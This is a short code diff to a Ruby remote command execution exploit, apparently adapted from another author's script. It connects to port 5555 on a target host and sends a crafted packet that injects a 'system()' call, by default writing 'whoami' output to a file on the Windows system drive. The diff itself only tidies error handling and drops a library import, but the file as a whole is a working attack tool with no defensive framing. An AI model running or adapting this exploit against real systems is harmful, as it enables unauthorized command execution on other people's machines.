@@ -5,7 +5,7 @@
 # ripped from...alessandro/mclaudio
 
 require 'socket'
-require 'rex'
+#require 'rex'
 
 host = ARGV[0]
 cmd  = ARGV[1] || "whoami >> %SYSTEMDRIVE%\\mc.txt"
@@ -37,8 +37,8 @@ crafted_pkt << "\x00 -esystem('#{command}')\x00"
 
 #puts Rex::Text.to_hex_dump(crafted_pkt)    
 
-sock = TCPSocket.new(host,5555)
 begin
+ sock = TCPSocket.new(host,5555)
  puts "[*] Executing command '#{command}'..."
  sock.write(crafted_pkt)
 rescue => e
